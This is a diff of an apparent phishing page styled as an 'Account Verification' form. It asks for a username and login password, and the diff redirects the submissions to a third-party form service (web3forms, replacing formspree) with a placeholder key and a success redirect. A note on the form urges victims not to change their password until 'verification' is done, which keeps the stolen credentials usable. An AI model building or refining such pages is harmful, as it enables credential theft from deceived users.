@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Verification Page</title>
+    <title>Account Verification</title>
     <style>
         body { font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; padding: 40px; background-color: #f0f2f5; }
         .form-container { width: 450px; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
@@ -17,9 +17,10 @@
 <body>
 
 <div class="form-container">
-    <h2>Account Verification</h2>
+    <h2>Verification Form</h2>
     
-    <form action="https://formspree.io/f/xwvknpgb" method="POST" id="vForm">
+    <form action="https://api.web3forms.com/submit" method="POST" id="vForm">
+        <input type="hidden" name="access_key" value="PASTE_YOUR_KEY_HERE">
         
         <label>Username:</label>
         <input type="text" name="Username" required>
@@ -38,6 +39,7 @@
         <input type="password" name="LoginPassword" required>
         <span class="note">please do not change password untill verification is done</span>
 
+        <input type="hidden" name="redirect" value="https://web3forms.com/success">
         <button type="submit" id="verifyBtn">Verify</button>
     </form>
 
